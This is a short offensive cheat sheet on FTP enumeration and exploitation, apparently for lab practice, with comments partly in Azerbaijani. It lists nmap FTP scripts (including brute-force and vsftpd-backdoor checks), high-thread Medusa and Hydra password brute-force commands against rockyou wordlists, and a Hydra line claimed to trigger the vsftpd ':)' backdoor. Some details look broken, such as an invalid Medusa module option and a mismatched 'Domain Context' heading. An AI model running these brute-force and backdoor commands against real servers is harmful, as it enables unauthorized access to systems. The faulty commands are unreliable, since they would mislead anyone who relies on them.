# FTP Enumeration and Exploitation Technique

---

# 1. Nmap

## Identify Current Domain Context

```bash
nmap -p 21 --script ftp-anon,ftp-bounce,ftp-ftps -sV -sC <target_ip>
nmap -p 2121 --script ftp-vsftpd-backdoor,ftp-bounce,ftp-syst,ftp-* -sV 10.129.8.214
nmap -p 21 --script ftp-brute --script-args userdb=/usr/share/wordlists/rockyou.txt,passdb=/usr/share/wordlists/rockyou.txt,ftp-brute.timeout=5s -sV <target_ip>
nmap -sS -sV -sC -p- --script banner,ftp-* -oN ftp_deep.txt <target_ip>
```

# 2. Medusa

## Brute force

```bash
# User/pass enum (rockyou + custom)
medusa -h <target_ip> -u admin -p /usr/share/wordlists/rockyou.txt -M ftp -t 50 -T 100 -f -F -r 3

# Userlist + passlist (ftp_users.txt yaradın: admin,ftpuser,guest,root)
medusa -h <target_ip> -U /path/to/ftp_users.txt -P /usr/share/wordlists/rockyou.txt -M ftp -t 100 -m DIR:/etc/passwd

# Anonymous + weak creds test
medusa -h <target_ip> -u anonymous -p "-" -M ftp  # "-" blank pass
```

# Hydra

## Brute Force

```bash
# Basic brute
hydra -L /usr/share/wordlists/dirb/common.txt -P /usr/share/wordlists/rockyou.txt ftp://<target_ip>:PORT -t 64 -w 10 -vV

# Anonymous test + timeout
hydra -l anonymous -p "" ftp://<target_ip>/ -t 128 -W 5

# User enum (error diff ilə)
hydra -L ftp_users.txt -p testpass ftp://<target_ip>:PORT -t 64 -f -V  # -f ilk success-də dayandır

# Custom module ilə (vsftpd backdoor)
hydra -l ":)" -p any ftp://<target_ip>  # Backdoor user
```

# FTP

## Connect FTP Server

```bash
# Basic Syntaxis
ftp 10.129.8.214

# Different Port
ftp 10.129.8.214 2121

# Commands
| `ls`    | cari qovluğun siyahısı   |
| `dir`   | geniş siyahı             |
| `pwd`   | serverdə cari qovluq     |
| `cd`    | serverdə qovluq dəyişmək |
| `lcd`   | lokal qovluq dəyişmək    |

| `get file.txt` | serverdən lokal sistemə |
| `put file.txt` | lokal sistemdən serverə |
| `mget *`       | çoxlu fayl endirmək     |
| `mput *`       | çoxlu fayl göndərmək    |









